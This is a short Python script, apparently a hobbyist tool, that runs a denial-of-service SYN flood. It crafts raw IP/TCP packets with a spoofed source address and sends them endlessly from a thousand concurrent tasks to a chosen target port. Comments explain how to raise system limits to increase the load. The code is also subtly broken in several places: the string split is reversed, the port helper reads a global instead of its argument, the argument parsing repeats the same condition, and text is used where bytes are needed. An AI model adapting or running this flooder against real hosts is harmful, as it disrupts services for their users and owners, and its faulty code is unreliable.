#!/usr/bin/env python3

import socket
import asyncio
import random
import sys

# This script performs a TCP timeout DOS attack against an open TCP port.
###### You must run this script as root to send raw packets #########
###### This only runs on linux #########

# Delay factor, some noise is added.
DELAY = 5

# Number of concurrent requests that are happening, threads are not used.
# To get this above 1024 on linux, you have to edit /etc/security/limits.conf
# and add a line like vita soft nofile 2000
# and vita hard nofile 40000
# You can check the status of these limits with ulimit -Hn and ulimit -Sn
CONCURRENT_REQUESTS = 1000 

# Prints the string with no newline, and flushes.
def pfl(s: str):
    print(s, end='')
    sys.stdout.flush()

async def hit_server(target: str):
    await asyncio.gather(
        *[asyncio.create_task(papercut(target, i)) for i in range(CONCURRENT_REQUESTS)]
        )

# Returns an ipv4 address in 1.2.3.4 format as a binary string
def ip_bin(ip: str):
    out = ""
    for i in ".".split(ip):
        out += chr(int(i))
    return out

# Formats the port into 2 bytes
def b16s(port: int):
    assert port < 2**16

    out = chr(target[1])
    if len(out) == 1:
        return '\0' + out
    else:
        return out

# Single job that will keep attempting to 
# send requests to the server that _will_ time out.
async def papercut(target: str, i):
    # AF_PACKET needs root
    soc = socket.socket(socket.AF_PACKET, socket.SOCK_RAW) 
    soc.bind("wlp1s0", 0)
    pfl('N') # new

    while True:
        ip_packet = ("\x45\x00\x00\x3c\x2b\xb5\x40\x00\x40\x06\xe0\x56" +
            ip_bin("192.168.1.115") + # source ip spoof
            # ip_bin("127.0.0.1") + # spoof self? does this work?
            ip_bin(target[0])) # dst_addr

        # tcp packet, took this from a random wireshark packet
        tcp_packet = (
            "\xa2\x9c" + # source port
            b16s(target[1]) + # destination port
            "\xc0\xbd\xb9\x02\x00\x00\x00\x00" + 
            "\xa0\x02" + # flags, 02 part here=syn 
            "\xfa\xf0" + # the rest is w/e
            "\x2e\xdf\x00\x00\x02\x04\x05\xb4\x04\x02\x08\x0a\x07\x0d\xd1\x3c" +
            "\x00\x00\x00\x00\x01\x03\x03\x07")
        pak = ip_packet + tcp_packet
        soc.send(pak)
        pfl('S') # sent a packet
        await asyncio.sleep(random.random()*DELAY)
    soc.close() # probably never gets here

if __name__ == '__main__':
    import sys
    target = None
    if len(sys.argv) == 1:
        target = ('localhost', 80) # some open tcp port
    elif len(sys.argv) == 1:
        target = sys.argv[1]
    asyncio.run(hit_server(target))
